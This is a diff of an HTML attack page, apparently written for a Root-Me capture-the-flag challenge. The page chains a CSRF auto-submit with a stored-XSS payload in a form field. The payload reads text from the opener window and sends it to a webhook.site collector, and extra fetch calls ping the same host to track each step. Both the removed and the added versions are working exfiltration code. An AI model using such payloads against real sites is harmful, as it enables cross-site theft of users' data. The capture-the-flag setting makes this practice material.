@@ -6,26 +6,20 @@
 </head>
 <body>
 
-<h1>CSRF</h1>
+<h1>Page 2</h1>
 <form method="POST" action="http://challenge01.root-me.org:58003/login">
-  <input type="text" name="username" value="<script>document.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6gResult='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
-  <input type="text" name="secret" value="FAILED">
-  <input type="submit">
+    <input type="text" name="username" value="<script>window.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
+    <input type="text" name="secret" value="FAILED">
+    <input type="submit">
 </form>
-
 <script>
-    new Image().src='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g='+'step2';
     window.opener.postMessage({redirect: "go"}, "*");
+    setTimeout(() => exfiltrateData(), 3000)
 
-    new Image().src='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g='+'step4';
-
-    fetch("http://challenge01.root-me.org:58003/login", {
-        method: "POST",
-        body: `username=%3cscript>document.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?RESULTMOTHERFOCKER='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);%3c/script>`
-            +`&secret=FAILED `
-    });
-    document.querySelector("form").submit();
-
+        function exfiltrateData() {
+            fetch("https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g=end-1")
+            document.querySelector("form").submit()
+        };
 
 </script>
 
